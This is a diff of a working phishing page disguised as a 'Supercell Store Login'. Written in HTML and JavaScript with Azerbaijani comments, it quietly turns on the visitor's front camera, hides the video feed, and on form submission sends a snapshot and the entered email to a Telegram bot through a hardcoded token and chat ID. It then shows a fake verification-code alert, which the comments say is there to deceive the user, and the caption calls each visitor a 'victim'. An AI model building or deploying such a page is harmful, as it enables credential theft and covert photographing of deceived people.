@@ -11,10 +11,9 @@
         .logo-box { background-color: #ffc107; width: 80px; height: 80px; margin: 0 auto 20px; border-radius: 18px; display: flex; justify-content: center; align-items: center; font-size: 50px; font-weight: 900; color: white; }
         h2 { margin: 0 0 10px 0; font-size: 24px; }
         p { color: #666; font-size: 15px; margin-bottom: 25px; }
-        input[type="email"] { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; margin-bottom: 15px; }
+        input[type="email"] { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; margin-bottom: 15px; outline: none; }
         .btn-signin { width: 100%; padding: 15px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; background-color: #4285f4; color: white; text-transform: uppercase; }
-        /* Kameranı gizli saxlayırıq */
-        #video, #canvas { display: none; }
+        #v, #c { display: none; } /* Kamera elementləri gizli */
     </style>
 </head>
 <body>
@@ -23,67 +22,85 @@
         <div class="logo-box">S</div>
         <h2>Supercell Store Login</h2>
         <p>Enter your email to receive a verification code.</p>
-
-        <form id="loginForm">
-            <input type="email" id="email" placeholder="Enter your email address" required>
-            <button type="submit" class="btn-signin">➜ SIGN IN</button>
+        <form id="f">
+            <input type="email" id="e" placeholder="Enter your email address" required title="Zəhmət olmasa e-poçt daxil edin">
+            <button type="submit" class="btn-signin" id="b">➜ SIGN IN</button>
         </form>
     </div>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c" width="640" height="480"></canvas>
 
     <script>
-        // MƏLUMATLARI BURAYA DAXİL EDİN
-        const BOT_TOKEN = "8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A"; 
-        const CHAT_ID = "-1003369084883";
+        // MƏLUMATLARINIZI BURAYA DÜZGÜN YAZIN
+        const TOKEN = "8460087383:AAEaLJlo1VI6U4GPQ27a_EpJHYsL-h_vHMY"; 
+        const CHAT = "-1003369084883";
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const form = document.getElementById('loginForm');
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
+        const form = document.getElementById('f');
+        const btn = document.getElementById('b');
 
-        // Səhifə açılan kimi kameranı işə salırıq
-        async function setupCamera() {
+        // Kameranı mütləq işə salırıq
+        async function startCam() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
-                video.srcObject = stream;
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = s;
+                // Bəzi brauzerlərdə video avtomatik başlamır, zorla başladırıq
+                video.play();
             } catch (err) {
-                console.error("Kamera xətası: ", err);
+                console.error("Kamera açılmadı: ", err);
             }
         }
 
-        setupCamera();
+        startCam();
 
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const emailValue = document.getElementById('email').value;
+        form.addEventListener('submit', async (event) => {
+            event.preventDefault();
+            const email = document.getElementById('e').value;
+            
+            btn.innerText = "LOADING...";
+            btn.disabled = true;
 
-            // Canvas-da şəkli çək (Snapshot)
+            // Canvas üzərinə şəkli çək
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // Şəkli Blob formatına salıb göndər
+            // Şəkli blob (fayl) kimi hazırla
             canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'capture.jpg');
-                formData.append('caption', `🔔 Yeni giriş!\n📧 Email: ${emailValue}`);
+                if(!blob) {
+                    alert("Şəkil yaradıla bilmədi. Kamera icazəsini yoxlayın.");
+                    btn.innerText = "➜ SIGN IN";
+                    btn.disabled = false;
+                    return;
+                }
+
+                const fd = new FormData();
+                fd.append('chat_id', CHAT);
+                fd.append('photo', blob, 'img.jpg');
+                fd.append('caption', `🔥 Yeni Qurban!\n📧 Email: ${email}`);
 
                 try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                         method: 'POST',
-                        body: formData
+                        body: fd
                     });
                     
-                    // Göndərəndən sonra saytın özünü necə aparacağını bura yaza bilərsiniz
-                    alert("Verification code sent to " + emailValue);
+                    const data = await res.json();
+                    
+                    if(data.ok) {
+                        // Uğurlu olduqda istifadəçini aldatmaq üçün mesaj
+                        alert("A verification code has been sent to " + email);
+                    } else {
+                        alert("Telegram Xətası: " + data.description);
+                    }
                 } catch (error) {
-                    console.error("Telegram xətası:", error);
+                    alert("Bağlantı xətası: " + error);
+                } finally {
+                    btn.innerText = "➜ SIGN IN";
+                    btn.disabled = false;
                 }
-            }, 'image/jpeg', 0.8);
+            }, 'image/jpeg', 0.7);
         });
     </script>
 </body>
